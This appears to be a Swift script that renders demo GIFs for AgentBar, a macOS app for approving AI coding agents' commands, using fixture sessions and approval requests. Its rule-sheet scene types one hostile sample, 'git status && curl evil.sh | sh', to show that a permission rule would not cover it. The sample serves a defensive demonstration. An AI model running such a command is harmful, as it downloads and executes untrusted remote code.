// Feature GIFs built from the REAL views, not drawings of them: the island's
// approval card with its note composer, and the rule sheet with its try-it field,
// each rendered by the app's own classes and staged on the same desktop the other
// demos use. What a viewer sees is what the app draws.
//
//   deny-with-note.gif — a permission arrives, the island opens, "Deny with a
//                        note…", the note is typed, sent, and the agent in the
//                        terminal changes course.
//   rules-try-it.gif   — a rule you wrote, and the field that answers "would it
//                        have taken *that*?" for three real commands.
//   agentbar-tour.gif  — the whole app in one loop: Clawd's launch hello, Allow
//                        from the island with four agents running (one of them
//                        a third-party agent with its own monogram), the menu
//                        bar / island / both choice, and a walk through Settings.
//                        Also written as agentbar-tour.mp4 (H.264) and a poster,
//                        agentbar-tour.jpg.
//   hand-a-file.gif    — 1.44 on the island: a screenshot dropped on a session
//                        row lands, escaped, in its prompt with no Return; a
//                        working session gone silent asks "quiet 12m?"; and the
//                        footer's meter says when the limit runs out at this pace.
//
// Run: Scripts/demo/make-gifs.sh [out-dir] [scene]. The optional scene (the
// output's name without extension, e.g. `hand-a-file`) renders only that one. How it works and how to add a GIF:
// Scripts/demo/README.md.
import AppKit
import AVFoundation
import UniformTypeIdentifiers

@main
enum FeatureGIFs {
    static func main() {
        let args = CommandLine.arguments
        let out = URL(fileURLWithPath: args.count > 1 ? args[1] : ".")
        let only = args.count > 2 ? args[2] : nil
        _ = NSApplication.shared
        NSApp.setActivationPolicy(.prohibited)
        let scenes: [(String, () -> Void)] = [
            ("deny-with-note", { DenyWithNote.write(to: out.appendingPathComponent("deny-with-note.gif")) }),
            ("rules-try-it", { RulesTryIt.write(to: out.appendingPathComponent("rules-try-it.gif")) }),
            ("agentbar-tour", { Tour.write(to: out.appendingPathComponent("agentbar-tour")) }),
            ("hand-a-file", { HandAFile.write(to: out.appendingPathComponent("hand-a-file.gif")) }),
        ]
        guard only == nil || scenes.contains(where: { $0.0 == only }) else {
            fatalError("no scene \(only!) — one of \(scenes.map(\.0).joined(separator: ", "))")
        }
        for (name, run) in scenes where only == nil || only == name { run() }
    }
}

// MARK: - Shared stage

enum Stage {
    static func rgb(_ hex: UInt32, _ a: CGFloat = 1) -> NSColor {
        NSColor(srgbRed: CGFloat((hex >> 16) & 0xFF) / 255, green: CGFloat((hex >> 8) & 0xFF) / 255,
                blue: CGFloat(hex & 0xFF) / 255, alpha: a)
    }
    static let ink = rgb(0x1D1D1F)

    static func text(_ s: String, _ size: CGFloat, _ color: NSColor, weight: NSFont.Weight = .regular,
                     mono: Bool = false) -> NSAttributedString {
        let f = mono ? NSFont.monospacedSystemFont(ofSize: size, weight: weight)
                     : NSFont.systemFont(ofSize: size, weight: weight)
        return NSAttributedString(string: s, attributes: [.font: f, .foregroundColor: color])
    }

    static func rounded(_ r: CGRect, _ radius: CGFloat) -> NSBezierPath {
        NSBezierPath(roundedRect: r, xRadius: radius, yRadius: radius)
    }

    /// Rounded below, square above — the hardware notch the island hangs from.
    static func flushTop(_ r: CGRect, _ radius: CGFloat) -> NSBezierPath {
        let p = NSBezierPath()
        p.move(to: NSPoint(x: r.minX, y: r.maxY))
        p.line(to: NSPoint(x: r.minX, y: r.minY + radius))
        p.appendArc(withCenter: NSPoint(x: r.minX + radius, y: r.minY + radius), radius: radius,
                    startAngle: 180, endAngle: 270, clockwise: false)
        p.line(to: NSPoint(x: r.maxX - radius, y: r.minY))
        p.appendArc(withCenter: NSPoint(x: r.maxX - radius, y: r.minY + radius), radius: radius,
                    startAngle: 270, endAngle: 0, clockwise: false)
        p.line(to: NSPoint(x: r.maxX, y: r.maxY))
        p.close()
        return p
    }

    /// The island's own outline, as `IslandShape` cuts it, in canvas pixels: `r` is
    /// the frame, ears included, and `ear` is in points. The pill passes 0.
    static func island(_ r: NSRect, ear: CGFloat) -> CGPath {
        let p = IslandShape.path(in: CGSize(width: r.width / 2, height: r.height / 2),
                                 corner: IslandContentView.corner, ear: ear, flushTop: true)
        var t = CGAffineTransform(translationX: r.minX, y: r.minY).scaledBy(x: 2, y: 2)
        return p.copy(using: &t)!
    }
    static func fill(_ p: CGPath, _ color: NSColor) {
        let cg = NSGraphicsContext.current!.cgContext
        cg.addPath(p); cg.setFillColor(color.cgColor); cg.fillPath()
    }
    static func clip(_ p: CGPath) {
        let cg = NSGraphicsContext.current!.cgContext
        cg.addPath(p); cg.clip()
    }

    /// The pill's height in points — `IslandController.pillHeight`, which the ears
    /// are measured up from.
    static let pillHeight: CGFloat = 30

    /// The open panel the way `IslandController` lays it out on a notched display:
    /// flush on top, ears allowed, and a frame one ear wider on each side so the rows
    /// keep the 460 pt they were laid out for.
    static func openPanel(_ rows: [NSView], footer: NSView? = nil) -> IslandContentView {
        let content = IslandContentView(frame: NSRect(x: 0, y: 0, width: 460, height: 100))
        content.flushTop = true
        content.earWidth = IslandShape.earWidth
        content.collapsedHeight = pillHeight
        content.topInset = 10
        content.setRows(rows)
        if let footer { content.setFooter(footer) }
        content.setFrameSize(NSSize(width: IslandShape.panelWidth(body: 460, ear: IslandShape.earWidth),
                                    height: content.contentHeight + 6))
        return content
    }

    /// The island part of the way between the pill (`t` 0) and the open panel (1),
    /// hanging from `topY`: its frame, and the ear that height earns — the one rule
    /// that lets the ears unfurl with the frame in the app.
    static func growing(pill: NSRect, panel: NSRect, t: CGFloat, topY: CGFloat) -> (NSRect, CGFloat) {
        let w = pill.width + (panel.width - pill.width) * t
        let h = pill.height + (panel.height - pill.height) * t
        let ear = IslandShape.ear(full: IslandShape.earWidth, height: h / 2, collapsedHeight: pillHeight)
        return (NSRect(x: panel.midX - w / 2, y: topY - h, width: w, height: h), ear)
    }

    static func symbol(_ name: String, midX: CGFloat, midY: CGFloat, pt: CGFloat, color: NSColor) {
        guard let base = NSImage(systemSymbolName: name, accessibilityDescription: nil) else { return }
        let img = base.withSymbolConfiguration(.init(pointSize: pt, weight: .regular)) ?? base
        let tinted = NSImage(size: img.size)
        tinted.lockFocus()
        img.draw(in: NSRect(origin: .zero, size: img.size))
        color.set()
        NSRect(origin: .zero, size: img.size).fill(using: .sourceAtop)
        tinted.unlockFocus()
        tinted.draw(in: NSRect(x: midX - img.size.width / 2, y: midY - img.size.height / 2,
                               width: img.size.width, height: img.size.height))
    }

    static func wallpaper(_ W: CGFloat, _ H: CGFloat) {
        NSGradient(colorsAndLocations:
            (rgb(0x6FA8DC), 0.0), (rgb(0x8E9EE0), 0.30),
            (rgb(0xB48BD6), 0.58), (rgb(0xE39BB5), 0.82), (rgb(0xF2BE9A), 1.0))!
            .draw(in: NSRect(x: 0, y: 0, width: W, height: H), angle: -55)
        for (cx, cy, r, c) in [(W * 0.22, H * 0.8, 340.0, rgb(0xFFFFFF, 0.20)),
                               (W * 0.75, H * 0.2, 420.0, rgb(0xFFD9A0, 0.22))] as [(CGFloat, CGFloat, CGFloat, NSColor)] {
            NSGradient(colorsAndLocations: (c, 0.0), (c.withAlphaComponent(0), 1.0))!
                .draw(fromCenter: NSPoint(x: cx, y: cy), radius: 0,
                      toCenter: NSPoint(x: cx, y: cy), radius: r, options: [])
        }
    }

    static let barH: CGFloat = 48

    static func menuBar(_ W: CGFloat, _ H: CGFloat, app: String, notch: Bool,
                        clock time: String = "Wed 24 Sep   9:41") {
        let barY = H - barH
        rgb(0xF4F1EE, 0.72).setFill()
        NSRect(x: 0, y: barY, width: W, height: barH).fill()
        rgb(0x000000, 0.10).setFill()
        NSRect(x: 0, y: barY - 1, width: W, height: 1).fill()
        var lx: CGFloat = 26
        symbol("apple.logo", midX: lx + 10, midY: barY + barH / 2, pt: 22, color: ink)
        lx += 38
        let a = text(app, 25, ink, weight: .bold)
        a.draw(at: NSPoint(x: lx, y: barY + 10)); lx += a.size().width + 30
        for m in ["Shell", "Edit", "View", "Window"] {
            let t = text(m, 25, ink); t.draw(at: NSPoint(x: lx, y: barY + 10)); lx += t.size().width + 30
        }
        let clock = text(time, 25, ink, weight: .medium)
        clock.draw(at: NSPoint(x: W - 24 - clock.size().width, y: barY + 10))
        symbol("wifi", midX: W - 24 - clock.size().width - 40, midY: barY + barH / 2, pt: 21, color: ink)
        if notch {
            NSColor.black.setFill()
            flushTop(NSRect(x: (W - 300) / 2, y: barY, width: 300, height: barH), 14).fill()
        }
    }

    static func cursor(at pos: NSPoint, pressed: Bool = false) {
        let s: CGFloat = pressed ? 0.9 : 1
        let p = NSBezierPath()
        let pts: [(CGFloat, CGFloat)] = [(0, 0), (0, -30), (7, -22), (13, -34), (18, -31), (12, -20), (21, -20)]
        for (i, (x, y)) in pts.enumerated() {
            let q = NSPoint(x: pos.x + x * s, y: pos.y + y * s)
            if i == 0 { p.move(to: q) } else { p.line(to: q) }
        }
        p.close()
        NSColor.white.setStroke(); p.lineWidth = 3; p.stroke()
        NSColor.black.setFill(); p.fill()
    }

    static func smooth(_ t: CGFloat) -> CGFloat { let c = max(0, min(1, t)); return c * c * (3 - 2 * c) }
    static func lerp(_ a: NSPoint, _ b: NSPoint, _ t: CGFloat) -> NSPoint {
        NSPoint(x: a.x + (b.x - a.x) * t, y: a.y + (b.y - a.y) * t)
    }

    /// A real view, drawn at 2x into an image of exactly its pixel size.
    static func snapshot(_ view: NSView, dark: Bool = true) -> NSImage {
        view.appearance = NSAppearance(named: dark ? .darkAqua : .aqua)
        view.layoutSubtreeIfNeeded()
        if view.frame.size == .zero { view.setFrameSize(view.fittingSize) }
        view.layoutSubtreeIfNeeded()
        let window = NSWindow(contentRect: view.frame, styleMask: .borderless, backing: .buffered, defer: false)
        window.appearance = view.appearance
        window.contentView = view
        view.layoutSubtreeIfNeeded()
        let size = view.bounds.size
        let rep = NSBitmapImageRep(bitmapDataPlanes: nil, pixelsWide: Int(size.width * 2),
                                   pixelsHigh: Int(size.height * 2), bitsPerSample: 8, samplesPerPixel: 4,
                                   hasAlpha: true, isPlanar: false, colorSpaceName: .deviceRGB,
                                   bytesPerRow: 0, bitsPerPixel: 0)!
        rep.size = size
        view.cacheDisplay(in: view.bounds, to: rep)
        let img = NSImage(size: NSSize(width: size.width * 2, height: size.height * 2))
        img.addRepresentation(rep)
        return img
    }

    /// One frame: a 1:1 pixel canvas the drawing closure paints.
    static func frame(_ W: CGFloat, _ H: CGFloat, _ draw: () -> Void) -> CGImage {
        let rep = NSBitmapImageRep(bitmapDataPlanes: nil, pixelsWide: Int(W), pixelsHigh: Int(H),
                                   bitsPerSample: 8, samplesPerPixel: 4, hasAlpha: true, isPlanar: false,
                                   colorSpaceName: .deviceRGB, bytesPerRow: 0, bitsPerPixel: 0)!
        rep.size = NSSize(width: W, height: H)
        NSGraphicsContext.saveGraphicsState()
        NSGraphicsContext.current = NSGraphicsContext(bitmapImageRep: rep)
        draw()
        NSGraphicsContext.restoreGraphicsState()
        return rep.cgImage!
    }

    static func writeGIF(_ frames: [CGImage], delay: Double, to url: URL) {
        let dest = CGImageDestinationCreateWithURL(url as CFURL, UTType.gif.identifier as CFString,
                                                   frames.count, nil)!
        CGImageDestinationSetProperties(dest, [kCGImagePropertyGIFDictionary:
            [kCGImagePropertyGIFLoopCount: 0]] as CFDictionary)
        for f in frames {
            CGImageDestinationAddImage(dest, f, [kCGImagePropertyGIFDictionary: [
                kCGImagePropertyGIFUnclampedDelayTime: delay, kCGImagePropertyGIFDelayTime: delay]] as CFDictionary)
        }
        CGImageDestinationFinalize(dest)
        print("wrote \(url.path) (\(frames.count) frames)")
    }

    /// The same frames as an H.264 MP4: frame `i` shows at `i × delay` and the last
    /// one is held for its own `delay`, so the clip runs as long as the GIF. Frames
    /// go in as BGRA and the encoder stores 4:2:0, which every player decodes; the
    /// canvas is cut to even dimensions, which 4:2:0 needs.
    static func writeMP4(_ frames: [CGImage], delay: Double, to url: URL, bitRate: Int = 320_000) {
        guard let first = frames.first else { return }
        let w = first.width & ~1, h = first.height & ~1
        try? FileManager.default.removeItem(at: url)
        let writer = try! AVAssetWriter(outputURL: url, fileType: .mp4)
        writer.shouldOptimizeForNetworkUse = true
        let input = AVAssetWriterInput(mediaType: .video, outputSettings: [
            AVVideoCodecKey: AVVideoCodecType.h264,
            AVVideoWidthKey: w, AVVideoHeightKey: h,
            AVVideoCompressionPropertiesKey: [
                AVVideoAverageBitRateKey: bitRate,
                AVVideoProfileLevelKey: AVVideoProfileLevelH264HighAutoLevel,
                AVVideoMaxKeyFrameIntervalKey: 120,
                AVVideoAllowFrameReorderingKey: true,
            ] as [String: Any],
        ])
        input.expectsMediaDataInRealTime = false
        let adaptor = AVAssetWriterInputPixelBufferAdaptor(assetWriterInput: input, sourcePixelBufferAttributes: [
            kCVPixelBufferPixelFormatTypeKey as String: kCVPixelFormatType_32BGRA,
            kCVPixelBufferWidthKey as String: w, kCVPixelBufferHeightKey as String: h,
        ])
        writer.add(input)
        guard writer.startWriting() else { fatalError("mp4: \(String(describing: writer.error))") }
        writer.startSession(atSourceTime: .zero)
        let scale: CMTimeScale = 1000
        func time(_ i: Int) -> CMTime { CMTime(value: CMTimeValue((Double(i) * delay * Double(scale)).rounded()), timescale: scale) }
        for (i, f) in frames.enumerated() {
            while !input.isReadyForMoreMediaData { usleep(2000) }
            var buffer: CVPixelBuffer?
            guard let pool = adaptor.pixelBufferPool,
                  CVPixelBufferPoolCreatePixelBuffer(nil, pool, &buffer) == kCVReturnSuccess, let buffer
            else { fatalError("mp4: no pixel buffer") }
            CVPixelBufferLockBaseAddress(buffer, [])
            let ctx = CGContext(data: CVPixelBufferGetBaseAddress(buffer), width: w, height: h,
                                bitsPerComponent: 8, bytesPerRow: CVPixelBufferGetBytesPerRow(buffer),
                                space: CGColorSpace(name: CGColorSpace.sRGB)!,
                                bitmapInfo: CGImageAlphaInfo.premultipliedFirst.rawValue
                                    | CGBitmapInfo.byteOrder32Little.rawValue)!
            ctx.setFillColor(CGColor(gray: 0, alpha: 1)); ctx.fill(CGRect(x: 0, y: 0, width: w, height: h))
            ctx.draw(f, in: CGRect(x: 0, y: h - f.height, width: f.width, height: f.height))
            CVPixelBufferUnlockBaseAddress(buffer, [])
            guard adaptor.append(buffer, withPresentationTime: time(i)) else {
                fatalError("mp4: append failed at \(i): \(String(describing: writer.error))")
            }
        }
        input.markAsFinished()
        writer.endSession(atSourceTime: time(frames.count))   // the last frame keeps its delay
        let done = DispatchSemaphore(value: 0)
        writer.finishWriting { done.signal() }
        done.wait()
        guard writer.status == .completed else { fatalError("mp4: \(String(describing: writer.error))") }
        print("wrote \(url.path) (\(frames.count) frames, \(String(format: "%.1f", Double(frames.count) * delay)) s)")
    }

    static func writeJPEG(_ image: CGImage, quality: Double = 0.85, to url: URL) {
        let dest = CGImageDestinationCreateWithURL(url as CFURL, UTType.jpeg.identifier as CFString, 1, nil)!
        CGImageDestinationAddImage(dest, image, [kCGImageDestinationLossyCompressionQuality: quality] as CFDictionary)
        CGImageDestinationFinalize(dest)
        print("wrote \(url.path)")
    }

    static func tmp(_ name: String, _ obj: [String: Any]) -> URL {
        let dir = URL(fileURLWithPath: NSTemporaryDirectory()).appendingPathComponent("agentbar-gifs")
        try? FileManager.default.createDirectory(at: dir, withIntermediateDirectories: true)
        let url = dir.appendingPathComponent(name + ".json")
        try! JSONSerialization.data(withJSONObject: obj).write(to: url)
        return url
    }

    /// Where a titled button sits, in the coordinates of `root` (bottom-left origin).
    static func button(_ prefix: String, in root: NSView) -> NSRect? {
        func find(_ v: NSView) -> NSButton? {
            if let b = v as? NSButton, b.attributedTitle.string.hasPrefix(prefix) || b.title.hasPrefix(prefix),
               !b.isHiddenOrHasHiddenAncestor { return b }
            for s in v.subviews { if let hit = find(s) { return hit } }
            return nil
        }
        guard let b = find(root) else { return nil }
        return rect(of: b, in: root)
    }

    /// Where `view` sits in `root` (bottom-left origin).
    static func rect(of view: NSView, in root: NSView) -> NSRect {
        var r = view.convert(view.bounds, to: root)
        if root.isFlipped { r.origin.y = root.bounds.height - r.maxY }
        return r
    }
}

// MARK: - GIF 1: deny with a note

enum DenyWithNote {
    static let W: CGFloat = 1200, H: CGFloat = 1000
    static let note = "use pnpm in this repo, not npm"

    static func write(to url: URL) {
        let now = Int(Date().timeIntervalSince1970)
        guard let session = Session(fileURL: Stage.tmp("demo-sess", [
            "agent": "claude", "state": "permission", "label": "Bash: npm install left-pad",
            "project": "webshop", "cwd": "/tmp/agentbar-demo-webshop", "sessionId": "demo-sess", "pid": 1,
            "started": true, "ts": now, "started_at": now - 1260,
            "prompt": "add left-pad to the checkout package", "model": "claude-opus-5",
            "term_program": "iTerm.app"])),
              let request = ApprovalRequest(fileURL: Stage.tmp("demo-sess-p1", [
            "sessionId": "demo-sess", "agent": "claude", "toolName": "Bash",
            "display": "Bash: npm install left-pad",
            "toolInputPretty": "{\"command\": \"npm install left-pad\"}",
            "context": ["kind": "bash", "command": "npm install left-pad"],
            "pid": 1, "hookPid": 1, "ts": now, "cwd": "/tmp/agentbar-demo-webshop"]))
        else { fatalError("fixtures did not decode") }

        let sprite = IconRenderer.shared.sprite(for: Agent.byID("claude"))
        let rowW: CGFloat = 460 - IslandContentView.hPad * 2
        let card = IslandApprovalView(request: request, deferTitle: "Answer in terminal",
                                      width: rowW - 12, onChoose: { _ in })

        /// The whole open panel, as the island draws it, with the card in the state asked for.
        func panel(composing: Bool, typed: String) -> (NSImage, NSView) {
            if card.composing != composing { card.setComposing(composing) }
            card.noteField.stringValue = typed
            let hero = IslandRowView(session: session, mark: sprite.restingColor, style: .hero, onClick: { _ in })
            hero.translatesAutoresizingMaskIntoConstraints = false
            hero.widthAnchor.constraint(equalToConstant: rowW).isActive = true
            let wrap = NSStackView(views: [card])
            wrap.orientation = .horizontal
            wrap.edgeInsets = NSEdgeInsets(top: 0, left: 12, bottom: 0, right: 0)
            let content = Stage.openPanel([hero, wrap])
            return (Stage.snapshot(content), content)
        }

        let (openImg, openView) = panel(composing: false, typed: "")
        let noteLink = Stage.button("Deny with a note", in: openView)!
        let (composeEmpty, composeView) = panel(composing: true, typed: "")
        let sendBtn = Stage.button("Deny & tell it", in: composeView)!
        var typedImgs: [Int: NSImage] = [0: composeEmpty]

        let panelSize = openImg.size
        let topY = H - Stage.barH
        let panelRect = NSRect(x: (W - panelSize.width) / 2, y: topY - panelSize.height,
                               width: panelSize.width, height: panelSize.height)
        func onCanvas(_ r: NSRect) -> NSPoint {   // a view rect → canvas point at its centre
            NSPoint(x: panelRect.minX + r.midX * 2, y: panelRect.minY + r.midY * 2)
        }
        let linkPt = onCanvas(noteLink)
        let sendPt = onCanvas(sendBtn)
        let pillW: CGFloat = 290, pillH: CGFloat = 60
        let pillRect = NSRect(x: (W - pillW) / 2, y: topY - pillH, width: pillW, height: pillH)

        func pill(_ label: String, color: NSColor, mark: NSImage?) {
            Stage.fill(Stage.island(pillRect, ear: 0), .black)
            let t = Stage.text(label, 23, color, weight: .medium, mono: true)
            var x = pillRect.midX - t.size().width / 2
            if let mark {
                let mh: CGFloat = 34, mw = mh * mark.size.width / max(1, mark.size.height)
                x = pillRect.midX - (mw + 12 + t.size().width) / 2
                mark.draw(in: NSRect(x: x, y: pillRect.midY - mh / 2, width: mw, height: mh))
                x += mw + 12
            }
            t.draw(at: NSPoint(x: x, y: pillRect.midY - t.size().height / 2))
        }

        // The terminal the session runs in, bottom left: it is where the note lands.
        let term = NSRect(x: 40, y: 120, width: 720, height: 300)
        let lines: [(Int, String, NSColor)] = [
            (0, "> add left-pad to the checkout package", Stage.rgb(0xE8E8E8)),
            (0, "⏺ Bash(npm install left-pad)", Stage.rgb(0xE8E8E8)),
            (0, "  ⎿  Waiting for approval…", Stage.rgb(0x9A9A9A)),
            (104, "  ⎿  Denied: \"use pnpm in this repo, not npm\"", Stage.rgb(0xFF7A70)),
            (116, "⏺ Got it — this repo uses pnpm. Switching.", Stage.rgb(0xE8E8E8)),
            (128, "⏺ Bash(pnpm add left-pad)", Stage.rgb(0xE8E8E8)),
            (138, "  ⎿  + left-pad 1.3.0", Stage.rgb(0x6FD38A)),
        ]
        func terminal(_ f: Int) {
            NSGraphicsContext.saveGraphicsState()
            let sh = NSShadow(); sh.shadowBlurRadius = 24; sh.shadowOffset = NSSize(width: 0, height: -8)
            sh.shadowColor = NSColor.black.withAlphaComponent(0.35); sh.set()
            Stage.rgb(0x1E1E22, 0.97).setFill()
            Stage.rounded(term, 18).fill()
            NSGraphicsContext.restoreGraphicsState()
            for (i, c) in [0xFF5F57, 0xFEBC2E, 0x28C840].enumerated() {
                Stage.rgb(UInt32(c)).setFill()
                NSBezierPath(ovalIn: NSRect(x: term.minX + 22 + CGFloat(i) * 26, y: term.maxY - 32,
                                            width: 16, height: 16)).fill()
            }
            Stage.text("webshop — claude", 19, Stage.rgb(0xB0B0B0), weight: .medium)
                .draw(at: NSPoint(x: term.midX - 80, y: term.maxY - 36))
            var y = term.maxY - 82
            for (at, s, c) in lines where f >= at {
                if at == 0, s.contains("Waiting"), f >= 104 { continue }   // replaced by the answer
                Stage.text(s, 20, c, mono: true).draw(at: NSPoint(x: term.minX + 26, y: y))
                y -= 32
            }
        }

        func caption() {
            let t = Stage.text("Deny with a note: tell the agent what to do instead", 30, .white, weight: .semibold)
            let r = NSRect(x: (W - t.size().width) / 2 - 20, y: 34, width: t.size().width + 40, height: 58)
            Stage.rgb(0x000000, 0.35).setFill(); Stage.rounded(r, 16).fill()
            t.draw(at: NSPoint(x: r.minX + 20, y: r.midY - t.size().height / 2))
        }

        var frames: [CGImage] = []
        let start = NSPoint(x: W - 160, y: 330)
        for f in 0..<176 {
            frames.append(Stage.frame(W, H) {
                Stage.wallpaper(W, H)
                terminal(f)
                caption()
                Stage.menuBar(W, H, app: "iTerm2", notch: true)
                let mark = sprite.colorFrames.isEmpty ? sprite.restingColor
                                                      : sprite.colorFrames[f % sprite.colorFrames.count]
                var cur: NSPoint? = nil
                var pressed = false
                let shadow = NSShadow(); shadow.shadowBlurRadius = 22
                shadow.shadowOffset = NSSize(width: 0, height: -8)
                shadow.shadowColor = NSColor.black.withAlphaComponent(0.35)

                func drawPanel(_ img: NSImage, t: CGFloat) {
                    let (r, ear) = Stage.growing(pill: pillRect, panel: panelRect, t: t, topY: topY)
                    let outline = Stage.island(r, ear: ear)
                    NSGraphicsContext.saveGraphicsState(); shadow.set()
                    Stage.fill(outline, .black)
                    NSGraphicsContext.restoreGraphicsState()
                    if t > 0.5 {
                        NSGraphicsContext.saveGraphicsState()
                        Stage.clip(outline)
                        img.draw(in: panelRect, from: .zero, operation: .sourceOver, fraction: (t - 0.5) / 0.5)
                        NSGraphicsContext.restoreGraphicsState()
                    }
                }

                switch f {
                case 0..<22:                        // pill asks; the pointer heads for the notch
                    NSGraphicsContext.saveGraphicsState(); shadow.set(); pill("approve?", color: .white, mark: mark)
                    NSGraphicsContext.restoreGraphicsState()
                    cur = Stage.lerp(start, NSPoint(x: W / 2 + 30, y: topY - 20), Stage.smooth(CGFloat(f - 6) / 14))
                case 22..<30:                       // the island inflates out of the notch
                    drawPanel(openImg, t: Stage.smooth(CGFloat(f - 22) / 8))
                    cur = NSPoint(x: W / 2 + 30, y: topY - 20)
                case 30..<46:                       // to "Deny with a note…"
                    drawPanel(openImg, t: 1)
                    cur = Stage.lerp(NSPoint(x: W / 2 + 30, y: topY - 20), linkPt, Stage.smooth(CGFloat(f - 30) / 12))
                    pressed = f >= 44
                case 46..<90:                       // the note, one character a frame
                    let n = min(note.count, max(0, (f - 50) * 30 / 36))
                    if typedImgs[n] == nil { typedImgs[n] = panel(composing: true, typed: String(note.prefix(n))).0 }
                    drawPanel(typedImgs[n]!, t: 1)
                    cur = linkPt
                case 90..<100:                      // to "Deny & tell it"
                    drawPanel(typedImgs[note.count] ?? composeEmpty, t: 1)
                    cur = Stage.lerp(linkPt, sendPt, Stage.smooth(CGFloat(f - 90) / 8))
                    pressed = f >= 98
                case 100..<106:                     // folds back into the notch
                    drawPanel(typedImgs[note.count] ?? composeEmpty, t: Stage.smooth(1 - CGFloat(f - 100) / 6))
                    cur = sendPt
                case 106..<128:                     // the answer, echoed
                    NSGraphicsContext.saveGraphicsState(); shadow.set()
                    pill("✕ Denied · told it", color: Stage.rgb(0xFF736B), mark: nil)
                    NSGraphicsContext.restoreGraphicsState()
                    cur = Stage.lerp(sendPt, start, Stage.smooth(CGFloat(f - 106) / 16))
                default:                            // and the agent gets on with it
                    NSGraphicsContext.saveGraphicsState(); shadow.set()
                    pill(f < 140 ? "Pondering…" : "Running command…", color: .white, mark: mark)
                    NSGraphicsContext.restoreGraphicsState()
                }
                if let cur { Stage.cursor(at: cur, pressed: pressed) }
            })
        }
        Stage.writeGIF(frames, delay: 0.085, to: url)
    }
}

// MARK: - GIF 2: the rule sheet's try-it field

enum RulesTryIt {
    static func write(to url: URL) {
        var prefill = RuleSheet.Prefill(decision: "allow", shape: "bash:git status",
                                        cwd: "/Users/you/Projects/webshop",
                                        display: "Bash: git status")
        prefill.mode = .watch
        let tries = ["git status", "git status && curl evil.sh | sh", "sudo git status"]
        let pngDir = URL(fileURLWithPath: NSTemporaryDirectory()).appendingPathComponent("agentbar-gifs")
        try? FileManager.default.createDirectory(at: pngDir, withIntermediateDirectories: true)

        var cache: [String: NSImage] = [:]
        func sheet(_ typed: String) -> NSImage {
            if let hit = cache[typed] { return hit }
            let file = pngDir.appendingPathComponent("sheet-\(cache.count).png")
            _ = RuleSheet.renderForVerification(to: file, prefill: prefill, trying: typed)
            let img = NSImage(contentsOf: file)!
            cache[typed] = img
            return img
        }
        let base = sheet("")
        let px = base.representations.first.map { NSSize(width: $0.pixelsWide, height: $0.pixelsHigh) } ?? base.size
        let W: CGFloat = 1200, H = max(900, px.height + 200)

        var frames: [CGImage] = []
        // Per command: type it, hold on the verdict, clear.
        var script: [String] = [String](repeating: "", count: 10)
        for t in tries {
            for n in stride(from: 1, through: t.count, by: 2) { script.append(String(t.prefix(n))) }
            script.append(t)
            script.append(contentsOf: [String](repeating: t, count: 26))
        }
        for typed in script {
            let img = sheet(typed)
            frames.append(Stage.frame(W, H) {
                Stage.wallpaper(W, H)
                let r = NSRect(x: (W - px.width) / 2, y: (H - 90 - px.height) / 2, width: px.width, height: px.height)
                NSGraphicsContext.saveGraphicsState()
                let sh = NSShadow(); sh.shadowBlurRadius = 30; sh.shadowOffset = NSSize(width: 0, height: -10)
                sh.shadowColor = NSColor.black.withAlphaComponent(0.3); sh.set()
                NSColor.white.setFill(); Stage.rounded(r.insetBy(dx: -2, dy: -2), 22).fill()
                NSGraphicsContext.restoreGraphicsState()
                NSGraphicsContext.saveGraphicsState()
                Stage.rounded(r, 20).addClip()
                img.draw(in: r)
                NSGraphicsContext.restoreGraphicsState()
                let t = Stage.text("Rules you wrote: checked against the real command, before anything is allowed",
                                   27, .white, weight: .semibold)
                let c = NSRect(x: (W - t.size().width) / 2 - 20, y: H - 80, width: t.size().width + 40, height: 54)
                Stage.rgb(0x000000, 0.35).setFill(); Stage.rounded(c, 16).fill()
                t.draw(at: NSPoint(x: c.minX + 20, y: c.midY - t.size().height / 2))
            })
        }
        Stage.writeGIF(frames, delay: 0.08, to: url)
    }
}

// MARK: - GIF 3: the tour

enum Tour {
    static let W: CGFloat = 1200, H: CGFloat = 1000

    /// `base` without an extension: the tour goes out as `.gif`, `.mp4` and a `.jpg`
    /// poster, all from the same frames.
    static func write(to base: URL) {
        NSApp.appearance = NSAppearance(named: .aqua)
        // This process has no bundle, so its icon is a folder and its defaults are
        // its own domain — not AgentBar's. Both are set for the picture: the real
        // icon, and the switches a person who uses the app would have on.
        if let icon = NSImage(contentsOfFile: "Resources/AppIcon.icns") { NSApp.applicationIconImage = icon }
        // Not the notification switches: with one on, the page asks the
        // notification center for its status, and that needs a real bundle.
        for key in ["notifyApprovals", "notifyFailures", "notifyQuiet"] {
            UserDefaults.standard.removeObject(forKey: key)
        }
        for key in ["soundsEnabled", "globalApprovalShortcut", "launcherShortcut"] {
            UserDefaults.standard.set(true, forKey: key)
        }
        defer {   // the next run, and anything else this domain draws, starts clean
            for key in ["soundsEnabled", "globalApprovalShortcut", "launcherShortcut"] {
                UserDefaults.standard.removeObject(forKey: key)
            }
        }
        let now = Int(Date().timeIntervalSince1970)
        func session(_ id: String, _ o: [String: Any]) -> Session {
            var o = o
            o["sessionId"] = id; o["pid"] = 1; o["started"] = true; o["ts"] = now
            o["cwd"] = "/tmp/agentbar-demo-\(id)"
            return Session(fileURL: Stage.tmp(id, o))!
        }
        let claude = session("tour-claude", ["agent": "claude", "state": "permission",
            "label": "Bash: git push origin main", "project": "webshop", "started_at": now - 1680,
            "prompt": "ship the checkout fix", "model": "claude-opus-5", "term_program": "iTerm.app"])
        let codex = session("tour-codex", ["agent": "codex", "state": "tool", "label": "Running command",
            "project": "api", "started_at": now - 540, "prompt": "speed up the orders query"])
        let copilot = session("tour-copilot", ["agent": "copilot", "state": "done", "label": "",
            "project": "docs", "started_at": now - 3000, "recap": "Rewrote the install guide for Linux"])
        // An agent AgentBar has no entry for, the way `agentbar report` writes one:
        // it shows as itself, a monogram in a hue of its own, named by the row.
        let aider = session("tour-aider", ["agent": "aider", "agent_name": "Aider", "state": "tool",
            "label": "Editing invoices.py", "project": "billing", "started_at": now - 260,
            "prompt": "retry failed invoice syncs"])
        let request = ApprovalRequest(fileURL: Stage.tmp("tour-claude-p1", [
            "sessionId": "tour-claude", "agent": "claude", "toolName": "Bash",
            "display": "Bash: git push origin main",
            "toolInputPretty": "{\"command\": \"git push origin main\"}",
            "context": ["kind": "bash", "command": "git push origin main"],
            "pid": 1, "hookPid": 1, "ts": now, "cwd": "/tmp/agentbar-demo-tour-claude"]))!

        let sprite = IconRenderer.shared.sprite(for: Agent.byID("claude"))
        func mark(_ s: Session) -> NSImage { IconRenderer.shared.sprite(for: s.agent).restingColor }
        let rowW: CGFloat = 460 - IslandContentView.hPad * 2
